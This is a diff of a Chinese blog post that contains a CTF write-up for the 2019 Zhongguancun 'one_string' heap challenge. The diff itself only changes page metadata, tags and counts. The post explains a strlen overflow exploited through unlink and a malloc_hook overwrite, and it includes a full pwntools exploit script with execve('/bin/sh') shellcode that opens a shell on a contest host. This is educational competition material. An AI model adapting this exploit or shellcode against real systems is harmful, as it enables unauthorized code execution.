@@ -73,7 +73,7 @@
 
 
 
-  <meta name="keywords" content="2019中关村信息安全专项赛,">
+  <meta name="keywords" content="WP,">
 
 
 
@@ -84,18 +84,18 @@
 
 
 
-<meta name="description" content="题目自取 one_string:一道静态编译的32位堆题，被队长直接秒了一血orz，我等渣渣只能跟在屁股后面打打本地艰难生存这样子。。。。 漏洞和利用思路：漏洞点在于strlen造成的溢出。 逆向可能有点点难度。。。确定好各个函数，然后思路就很明了了，所有的保护都没开，还有chunklist，unlink为第一选择技巧，成功以后可以任意写，把一个chunk_ptr改为mmap地址，接着往mmap地">
-<meta name="keywords" content="2019中关村信息安全专项赛">
+<meta name="description" content="one_string:一道静态编译的32位堆题，被队长直接秒了一血orz，我等渣渣只能跟在屁股后面打打本地艰难生存这样子。。。。 漏洞和利用思路：漏洞点在于strlen造成的溢出。 逆向可能有点点难度。。。确定好各个函数，然后思路就很明了了，所有的保护都没开，还有chunklist，unlink为第一选择技巧，成功以后可以任意写，把一个chunk_ptr改为mmap地址，接着往mmap地址处注入s">
+<meta name="keywords" content="WP">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2019中关村信息安全专项赛">
 <meta property="og:url" content="http://yoursite.com/2019/08/16/2019中关村信息安全专项赛/index.html">
 <meta property="og:site_name" content="xiaoxiaorenwu">
-<meta property="og:description" content="题目自取 one_string:一道静态编译的32位堆题，被队长直接秒了一血orz，我等渣渣只能跟在屁股后面打打本地艰难生存这样子。。。。 漏洞和利用思路：漏洞点在于strlen造成的溢出。 逆向可能有点点难度。。。确定好各个函数，然后思路就很明了了，所有的保护都没开，还有chunklist，unlink为第一选择技巧，成功以后可以任意写，把一个chunk_ptr改为mmap地址，接着往mmap地">
+<meta property="og:description" content="one_string:一道静态编译的32位堆题，被队长直接秒了一血orz，我等渣渣只能跟在屁股后面打打本地艰难生存这样子。。。。 漏洞和利用思路：漏洞点在于strlen造成的溢出。 逆向可能有点点难度。。。确定好各个函数，然后思路就很明了了，所有的保护都没开，还有chunklist，unlink为第一选择技巧，成功以后可以任意写，把一个chunk_ptr改为mmap地址，接着往mmap地址处注入s">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-08-16T11:41:40.523Z">
+<meta property="og:updated_time" content="2021-01-09T04:07:36.814Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="2019中关村信息安全专项赛">
-<meta name="twitter:description" content="题目自取 one_string:一道静态编译的32位堆题，被队长直接秒了一血orz，我等渣渣只能跟在屁股后面打打本地艰难生存这样子。。。。 漏洞和利用思路：漏洞点在于strlen造成的溢出。 逆向可能有点点难度。。。确定好各个函数，然后思路就很明了了，所有的保护都没开，还有chunklist，unlink为第一选择技巧，成功以后可以任意写，把一个chunk_ptr改为mmap地址，接着往mmap地">
+<meta name="twitter:description" content="one_string:一道静态编译的32位堆题，被队长直接秒了一血orz，我等渣渣只能跟在屁股后面打打本地艰难生存这样子。。。。 漏洞和利用思路：漏洞点在于strlen造成的溢出。 逆向可能有点点难度。。。确定好各个函数，然后思路就很明了了，所有的保护都没开，还有chunklist，unlink为第一选择技巧，成功以后可以任意写，把一个chunk_ptr改为mmap地址，接着往mmap地址处注入s">
 
 
 
@@ -340,6 +340,28 @@
           </span>
 
           
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF-PWN/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF-PWN</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -413,8 +435,7 @@
       
 
       
-        <p><a href="https://drive.google.com/drive/folders/1YymQolN1DYhJsJNBz13dW-ZFvJ74VhDG" target="_blank" rel="noopener">题目自取</a></p>
-<h1 id="one-string"><a href="#one-string" class="headerlink" title="one_string:"></a>one_string:</h1><p>一道静态编译的32位堆题，被队长直接秒了一血orz，我等渣渣只能跟在屁股后面打打本地艰难生存这样子。。。。</p>
+        <h1 id="one-string"><a href="#one-string" class="headerlink" title="one_string:"></a>one_string:</h1><p>一道静态编译的32位堆题，被队长直接秒了一血orz，我等渣渣只能跟在屁股后面打打本地艰难生存这样子。。。。</p>
 <h2 id="漏洞和利用思路："><a href="#漏洞和利用思路：" class="headerlink" title="漏洞和利用思路："></a>漏洞和利用思路：</h2><p>漏洞点在于<code>strlen</code>造成的溢出。</p>
 <p>逆向可能有点点难度。。。确定好各个函数，然后思路就很明了了，所有的保护都没开，还有chunklist，<code>unlink</code>为第一选择技巧，成功以后可以任意写，把一个chunk_ptr改为mmap地址，接着往mmap地址处注入shellcode，再把一个chunk_ptr改为malloc_hook，然后把malloc_hook改为mmap地址即可。远程有点坑，我当时交互似乎出现了问题，没有接收到他输出的字符串信息。。。。</p>
 <h2 id="自己的exp，本地打通："><a href="#自己的exp，本地打通：" class="headerlink" title="自己的exp，本地打通："></a>自己的exp，本地打通：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">path = <span class="string">'./pwn'</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">attach = <span class="number">0</span></span><br><span class="line"><span class="comment">#P = ELF(path)</span></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,terminal=[<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>])</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">0</span>:</span><br><span class="line">	p = process(path)</span><br><span class="line">	<span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">		libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'df0a72047d6c.gamectf.com'</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	<span class="comment">#raw_input()</span></span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	<span class="comment">#raw_input()</span></span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	<span class="comment">#raw_input()</span></span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upgrade</span><span class="params">(index,content)</span>:</span></span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	<span class="comment">#raw_input()</span></span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	<span class="comment">#raw_input()</span></span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">	<span class="comment">#raw_input()</span></span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil('input:\n')</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x30</span>,<span class="string">'\x01'</span>*<span class="number">0x30</span>) <span class="comment">#0</span></span><br><span class="line">new(<span class="number">0x10</span>,<span class="string">'\x01'</span>*<span class="number">0x10</span>) <span class="comment">#1 0x100</span></span><br><span class="line">new(<span class="number">0x10</span>,<span class="string">'\x02'</span>*<span class="number">0x10</span>) <span class="comment">#2 0x200</span></span><br><span class="line">new(<span class="number">0x14</span>,p32(<span class="number">0x03030303</span>)+p32(<span class="number">0x18</span>)+p32(<span class="number">0x080eba40</span>+<span class="number">0xc</span><span class="number">-0xc</span>)+p32(<span class="number">0x080eba40</span>+<span class="number">0xc</span><span class="number">-8</span>)+<span class="string">'\x03'</span>*<span class="number">0x4</span>) <span class="comment">#3</span></span><br><span class="line">new(<span class="number">0x58</span>,p32(<span class="number">0x18</span>)+<span class="string">'\x04'</span>*<span class="number">0x54</span>) <span class="comment">#4</span></span><br><span class="line">new(<span class="number">0x10</span>,<span class="string">'\x05'</span>*<span class="number">0x10</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">upgrade(<span class="number">3</span>,p32(<span class="number">0x03030303</span>)+p32(<span class="number">0x03030303</span>)+p32(<span class="number">0x080eba40</span>+<span class="number">0xc</span><span class="number">-0xc</span>)+p32(<span class="number">0x080eba40</span>+<span class="number">0xc</span><span class="number">-8</span>)+<span class="string">'\x03'</span>*<span class="number">0x4</span>)</span><br><span class="line">upgrade(<span class="number">3</span>,p32(<span class="number">0x03030303</span>)+p32(<span class="number">0x18</span>)+p32(<span class="number">0x080eba40</span>+<span class="number">0xc</span><span class="number">-0xc</span>)+p32(<span class="number">0x080eba40</span>+<span class="number">0xc</span><span class="number">-8</span>)+p32(<span class="number">0x10</span>)+<span class="string">'\x60'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">shellcode =<span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"</span></span><br><span class="line">upgrade(<span class="number">3</span>,p32(<span class="number">0x080eb110</span>)+<span class="string">'\n'</span>)</span><br><span class="line">upgrade(<span class="number">0</span>,shellcode+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">upgrade(<span class="number">3</span>,p32(<span class="number">0x080EA4D8</span>))</span><br><span class="line">upgrade(<span class="number">0</span>,p32(<span class="number">0x080eb110</span>)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">new(<span class="number">0x10</span>,<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> attach == <span class="number">1</span>:</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
@@ -490,7 +511,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/2019中关村信息安全专项赛/" rel="tag"><i class="fa fa-tag"></i> 2019中关村信息安全专项赛</a>
+            <a href="/tags/WP/" rel="tag"><i class="fa fa-tag"></i> WP</a>
           
         </div>
       
@@ -503,8 +524,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/08/12/大型复盘：2019-DeLCTF/" rel="next" title="大型复盘：2019_DeLCTF/magic exit">
-                <i class="fa fa-chevron-left"></i> 大型复盘：2019_DeLCTF/magic exit
+              <a href="/2019/08/12/大型复盘：2019-DeLCTF/" rel="next" title="2019De1CTF/magic_exit">
+                <i class="fa fa-chevron-left"></i> 2019De1CTF/magic_exit
               </a>
             
           </div>
@@ -513,8 +534,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/08/18/小心得2/" rel="prev" title="小心得2">
-                小心得2 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/08/18/小心得2/" rel="prev" title="杂物2">
+                杂物2 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -597,7 +618,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-count">29</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -608,7 +629,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-count">4</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -619,7 +640,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
